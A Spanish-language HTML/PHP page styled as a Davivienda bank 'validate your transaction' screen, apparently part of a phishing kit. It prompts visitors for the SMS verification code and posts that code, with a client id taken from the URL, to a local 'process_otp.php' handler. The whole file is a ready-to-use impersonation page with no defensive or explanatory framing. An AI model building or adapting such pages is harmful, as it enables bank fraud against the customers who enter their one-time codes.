<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Davivienda | Autenticación</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Inter', Arial, sans-serif;
            background: #fff;
            min-height: 100vh;
        }

        .wrapper {
            max-width: 480px;
            margin: 0 auto;
            padding: 28px 24px;
        }

        /* ── Logo ────────────────────────────────── */
        .logo-wrap { margin-bottom: 32px; }
        .logo-wrap img { height: 38px; width: auto; }

        /* ── Icono escudo ───────────────────────── */
        .shield-icon {
            width: 58px;
            height: 58px;
            background: #FFF0F0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        /* ── Textos ─────────────────────────────── */
        h2 {
            font-size: 1.35rem;
            font-weight: 700;
            color: #111;
            margin-bottom: 10px;
        }

        .subtitle {
            color: #666;
            font-size: .9rem;
            line-height: 1.55;
            margin-bottom: 30px;
        }

        /* ── Label ───────────────────────────────── */
        .otp-label {
            display: block;
            font-size: .85rem;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
        }

        /* ── Input OTP ──────────────────────────── */
        .otp-input-wrapper { margin-bottom: 28px; }

        .otp-input-wrapper input[type="text"] {
            width: 100%;
            padding: 12px 16px;
            border: 1.5px solid #bdbdbd;
            border-radius: 8px;
            font-size: 1.2rem;
            font-weight: 600;
            letter-spacing: 10px;
            text-align: center;
            color: #111;
            outline: none;
            transition: border-color .2s;
            font-family: 'Inter', Arial, sans-serif;
        }

        .otp-input-wrapper input[type="text"]:focus { border-color: #E31B23; }

        /* ── Botón ──────────────────────────────── */
        .btn-submit {
            width: 100%;
            padding: 15px;
            background: #E31B23;
            color: #fff;
            border: none;
            border-radius: 50px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background .2s, transform .1s;
            font-family: 'Inter', Arial, sans-serif;
            margin-bottom: 24px;
        }

        .btn-submit:hover  { background: #c0151c; }
        .btn-submit:active { transform: scale(.98); }

        /* ── Links pie ──────────────────────────── */
        .footer-links {
            border-top: 1px solid #f0f0f0;
            padding-top: 18px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .footer-links a {
            color: #1565C0;
            font-size: .875rem;
            font-weight: 600;
            text-decoration: none;
        }
        .footer-links a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="wrapper">

        <!-- Logo -->
        <div class="logo-wrap">
            <img src="new-brand-red.svg" alt="Davivienda">
        </div>

        <!-- Icono -->
        <div class="shield-icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="none" viewBox="0 0 24 24" stroke="#E31B23" stroke-width="1.8">
                <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285Z"/>
            </svg>
        </div>

        <h2>Vamos a validar tu transacción</h2>
        <p class="subtitle">Ingresa el código SMS que acabamos de enviar a tu número de celular registrado.</p>

        <form action="process/process_otp.php" method="POST">
            <input type="hidden" name="cliente_id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>">

            <div class="otp-input-wrapper">
                <label class="otp-label" for="claveDinamica">Código de verificación</label>
                <input
                    type="text"
                    name="claveDinamica"
                    id="claveDinamica"
                    placeholder="· · · · · ·"
                    required
                    minlength="4"
                    maxlength="8"
                    pattern="\d*"
                    inputmode="numeric"
                    autocomplete="one-time-code"
                >
            </div>

            <button type="submit" class="btn-submit">ENVIAR</button>
        </form>

        <div class="footer-links">
            <a href="#">PEDIR OTRO CÓDIGO</a>
            <a href="#">¿Necesitas ayuda? | Términos de Uso</a>
        </div>

    </div>
</body>
</html>
